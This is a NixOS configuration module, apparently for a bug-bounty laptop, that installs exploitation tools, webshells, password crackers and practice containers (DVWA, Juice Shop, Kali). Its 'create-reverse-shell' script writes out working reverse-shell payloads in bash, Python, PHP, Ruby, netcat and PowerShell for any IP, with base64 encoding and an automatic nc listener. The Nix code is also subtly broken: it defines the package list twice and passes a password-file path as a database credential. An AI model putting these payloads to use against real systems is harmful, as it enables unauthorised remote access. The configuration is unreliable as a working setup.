# Exploitation Tools for Bug Bounty - Laptop Optimized
{
  config,
  pkgs,
  pkgs-unstable,
  ...
}: {
  environment.systemPackages = with pkgs-unstable; [
    # Metasploit - Laptop optimized config included below
    metasploit

    # Lightweight exploitation frameworks better suited for laptops
    commix # Command injection
    nuclei # Vulnerability scanner

    # Utilities
    ncat
    socat
    netcat
    wireshark
    tcpdump

    # Payload generators
    msfpc # MSFvenom Payload Creator

    # Web shells
    webshell # Various webshells
    weevely # Stealth PHP webshell

    # File transfer utilities
    python3 # For SimpleHTTPServer/http.server
    (pkgs.writeShellScriptBin "pyserve" ''
      #!/usr/bin/env bash
      # Quick Python HTTP server for file transfer
      PORT=''${1:-8000}
      python3 -m http.server $PORT
    '')

    # Local privilege escalation
    linux-smart-enumeration
    linpeas

    # Password cracking (lightweight options)
    john # John the Ripper
    hashcat

    # Create a resource-conscious Metasploit launcher
    (pkgs.writeShellScriptBin "msf-laptop" ''
      #!/usr/bin/env bash
      # Laptop-optimized Metasploit launcher

      # Check battery status
      BATTERY_PCT=$(cat /sys/class/power_supply/BAT*/capacity 2>/dev/null || echo "100")

      if [ "$BATTERY_PCT" -lt "30" ] && [ "$(cat /sys/class/power_supply/*/online 2>/dev/null | grep 1)" = "" ]; then
        echo "[!] Warning: Battery below 30% and not connected to power."
        echo "[!] Metasploit may drain your battery quickly."
        read -p "Continue anyway? (y/n) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
          exit 1
        fi
      fi

      # Create optimized configuration
      MSF_CONFIG="$HOME/.msf4/laptop.rc"
      mkdir -p "$HOME/.msf4"

      cat > "$MSF_CONFIG" << EOL
      # Laptop-optimized MSF settings
      setg ConsoleLogging true
      setg LogLevel 1
      setg MaxThreads 4
      setg SessionLogging true
      setg TimestampOutput true
      setg ExitOnSession false

      # Reduce database usage
      db_driver postgresql
      db_connect ${config.services.postgresql.authentication.passwordFile}@localhost/msf
      EOL

      # Launch Metasploit with optimized settings
      msfconsole -r "$MSF_CONFIG" "$@"
    '')
  ];

  # Configure PostgreSQL for Metasploit (lightweight config)
  services.postgresql = {
    enable = true;
    ensureDatabases = ["msf"];
    ensureUsers = [
      {
        name = "msf";
        ensurePermissions = {
          "DATABASE msf" = "ALL PRIVILEGES";
        };
      }
    ];
    # Laptop-optimized PostgreSQL settings
    settings = {
      shared_buffers = "256MB";
      work_mem = "16MB";
      maintenance_work_mem = "64MB";
      effective_cache_size = "512MB";
      max_connections = "20";
    };
  };

  # Docker containers for isolated exploitation
  virtualisation.docker = {
    enable = true;
    storageDriver = "overlay2";
  };

  # Pre-configured exploit environment containers
  environment.etc."bugbounty/docker-compose.yml".text = ''
    version: '3'
    services:
      # Vulnerable web application practice environments
      dvwa:
        image: vulnerables/web-dvwa
        container_name: dvwa
        ports:
          - "8082:80"
        restart: "no"

      # OWASP Juice Shop
      juiceshop:
        image: bkimminich/juice-shop
        container_name: juiceshop
        ports:
          - "3000:3000"
        restart: "no"

      # Exploit development environment
      kali:
        image: kalilinux/kali-rolling
        container_name: kali
        volumes:
          - ~/BugBounty/shared:/shared
        ports:
          - "2222:22"
        restart: "no"
        tty: true
        command: bash -c "apt-get update && apt-get install -y openssh-server && service ssh start && tail -f /dev/null"

    networks:
      default:
        name: bugbounty-network
  '';

  # Create helper scripts for exploitation
  environment.systemPackages = let
    setup-exploit-env = pkgs.writeShellScriptBin "setup-exploit-env" ''
      #!/usr/bin/env bash
      # Set up the exploitation environment

      mkdir -p ~/BugBounty/shared
      mkdir -p ~/BugBounty/payloads

      # Check if docker-compose is installed
      if ! command -v docker-compose &> /dev/null; then
        echo "[!] docker-compose not found. Please install it."
        exit 1
      fi

      # Check if docker is running
      if ! docker info &> /dev/null; then
        echo "[!] Docker is not running. Starting Docker service..."
        sudo systemctl start docker
      fi

      # Start the environment
      cd /etc/bugbounty
      docker-compose up -d

      echo "[+] Exploitation environment set up!"
      echo "    - DVWA available at: http://localhost:8082"
      echo "    - Juice Shop available at: http://localhost:3000"
      echo "    - Kali container running, connect with: docker exec -it kali bash"
      echo ""
      echo "[+] Shared directory available at: ~/BugBounty/shared"
    '';

    teardown-exploit-env = pkgs.writeShellScriptBin "teardown-exploit-env" ''
      #!/usr/bin/env bash
      # Tear down the exploitation environment to save resources

      cd /etc/bugbounty
      docker-compose down

      echo "[+] Exploitation environment stopped."
    '';

    create-reverse-shell = pkgs.writeShellScriptBin "create-reverse-shell" ''
      #!/usr/bin/env bash
      # Generate a reverse shell payload

      if [ $# -lt 2 ]; then
        echo "Usage: $0 <ip> <port> [type] [format]"
        echo "Types: bash, python, php, ruby, netcat, powershell (default: bash)"
        echo "Format: raw, base64 (default: raw)"
        exit 1
      fi

      IP=$1
      PORT=$2
      TYPE=''${3:-bash}
      FORMAT=''${4:-raw}

      OUTDIR="$HOME/BugBounty/payloads"
      mkdir -p "$OUTDIR"

      echo "[+] Generating $TYPE reverse shell for $IP:$PORT..."

      case $TYPE in
        bash)
          PAYLOAD="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
          ;;
        python)
          PAYLOAD="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
          ;;
        php)
          PAYLOAD="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
          ;;
        ruby)
          PAYLOAD="ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
          ;;
        netcat)
          PAYLOAD="nc -e /bin/sh $IP $PORT"
          ;;
        powershell)
          PAYLOAD="\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\",$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
          ;;
        *)
          echo "[!] Unknown shell type: $TYPE"
          exit 1
          ;;
      esac

      OUTPUT="$OUTDIR/reverse_shell_${TYPE}_${IP}_${PORT}"

      if [ "$FORMAT" = "base64" ]; then
        echo "$PAYLOAD" | base64 > "$OUTPUT.b64"
        echo "[+] Base64 encoded payload saved to: $OUTPUT.b64"
        echo "[+] To decode: echo \"$(cat "$OUTPUT.b64")\" | base64 -d | bash"
      else
        echo "$PAYLOAD" > "$OUTPUT.txt"
        echo "[+] Payload saved to: $OUTPUT.txt"
      fi

      # Automatically set up a listener
      echo "[+] Setting up a listener on port $PORT..."
      echo "[+] Press Ctrl+C to stop the listener"
      echo "[+] Execute the payload on the target machine to connect back"
      echo ""
      sudo nc -lvnp "$PORT"
    '';
  in [
    setup-exploit-env
    teardown-exploit-env
    create-reverse-shell
  ];
}
